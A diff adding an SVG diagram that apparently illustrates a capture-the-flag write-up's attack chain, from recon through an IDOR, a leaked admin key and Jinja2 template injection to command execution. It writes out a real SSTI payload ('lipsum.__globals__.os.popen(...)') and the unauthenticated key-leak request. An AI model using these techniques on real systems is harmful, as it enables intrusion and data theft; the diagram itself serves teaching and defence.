@@ -1,0 +1,57 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 340" font-family="'Chakra Petch','Segoe UI',Arial,sans-serif">
+  <rect x="0" y="0" width="800" height="340" rx="12" fill="#0d121d" stroke="#263451"/>
+  <text x="400" y="34" text-anchor="middle" font-size="17" font-weight="700" fill="#e3fffa">The chain behind the sample writeup</text>
+  <text x="400" y="54" text-anchor="middle" font-size="12" fill="#6c7b93" font-family="'JetBrains Mono',monospace">recon -&gt; IDOR -&gt; leaked key -&gt; SSTI -&gt; RCE -&gt; flag</text>
+
+  <defs>
+    <marker id="a" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto">
+      <path d="M0,0 L7,3 L0,6 z" fill="#6c7b93"/>
+    </marker>
+  </defs>
+
+  <!-- row 1 -->
+  <g text-anchor="middle">
+    <rect x="24" y="78" width="230" height="66" rx="7" fill="#111827" stroke="#00f0ff"/>
+    <text x="139" y="100" fill="#e3fffa" font-size="12">1. Recon</text>
+    <text x="139" y="118" fill="#9fb0c8" font-family="'JetBrains Mono',monospace" font-size="10">HTML comment -&gt; app.js leaks</text>
+    <text x="139" y="132" fill="#9fb0c8" font-family="'JetBrains Mono',monospace" font-size="10">/api/v2/users/&lt;id&gt;/keys</text>
+
+    <rect x="285" y="78" width="230" height="66" rx="7" fill="#111827" stroke="#ff2a6d" stroke-dasharray="5 4"/>
+    <text x="400" y="100" fill="#ff2a6d" font-size="12" font-weight="700">2. IDOR</text>
+    <text x="400" y="118" fill="#9fb0c8" font-family="'JetBrains Mono',monospace" font-size="10">GET /api/v2/users/1/keys</text>
+    <text x="400" y="132" fill="#9fb0c8" font-family="'JetBrains Mono',monospace" font-size="10">no auth, guess id=1</text>
+
+    <rect x="546" y="78" width="230" height="66" rx="7" fill="#111827" stroke="#fcee0a"/>
+    <text x="661" y="100" fill="#fcee0a" font-size="12">3. Leaked key</text>
+    <text x="661" y="118" fill="#9fb0c8" font-family="'JetBrains Mono',monospace" font-size="10">admin_api_key =</text>
+    <text x="661" y="132" fill="#9fb0c8" font-family="'JetBrains Mono',monospace" font-size="10">adm_k3y_31337_internal</text>
+  </g>
+
+  <!-- row 2 -->
+  <g text-anchor="middle">
+    <rect x="24" y="218" width="230" height="66" rx="7" fill="#111827" stroke="#ff2a6d" stroke-dasharray="5 4"/>
+    <text x="139" y="240" fill="#ff2a6d" font-size="12" font-weight="700">4. SSTI probe</text>
+    <text x="139" y="258" fill="#9fb0c8" font-family="'JetBrains Mono',monospace" font-size="10">POST /admin/template/preview</text>
+    <text x="139" y="272" fill="#9fb0c8" font-family="'JetBrains Mono',monospace" font-size="10">{{7*7}} -&gt; 49 (Jinja2)</text>
+
+    <rect x="285" y="218" width="230" height="66" rx="7" fill="#111827" stroke="#ff2a6d"/>
+    <text x="400" y="240" fill="#ff2a6d" font-size="12" font-weight="700">5. RCE</text>
+    <text x="400" y="258" fill="#9fb0c8" font-family="'JetBrains Mono',monospace" font-size="10">lipsum.__globals__.os</text>
+    <text x="400" y="272" fill="#9fb0c8" font-family="'JetBrains Mono',monospace" font-size="10">.popen('cat flag.txt')</text>
+
+    <rect x="546" y="218" width="230" height="66" rx="7" fill="#111827" stroke="#5fe3b0"/>
+    <text x="661" y="240" fill="#5fe3b0" font-size="12">6. Flag</text>
+    <text x="661" y="264" fill="#9fb0c8" font-family="'JetBrains Mono',monospace" font-size="10">FLAG{...ssti_rce_chain}</text>
+  </g>
+
+  <!-- arrows -->
+  <g stroke="#6c7b93" stroke-width="2" marker-end="url(#a)" fill="none">
+    <line x1="254" y1="111" x2="281" y2="111"/>
+    <line x1="515" y1="111" x2="542" y2="111"/>
+    <polyline points="661,144 661,181 139,181 139,214"/>
+    <line x1="254" y1="251" x2="281" y2="251"/>
+    <line x1="515" y1="251" x2="542" y2="251"/>
+  </g>
+
+  <text x="400" y="314" text-anchor="middle" font-size="11" fill="#6c7b93">Break any one link, the dev leak, the IDOR, or the SSTI, and the chain is cut.</text>
+</svg>
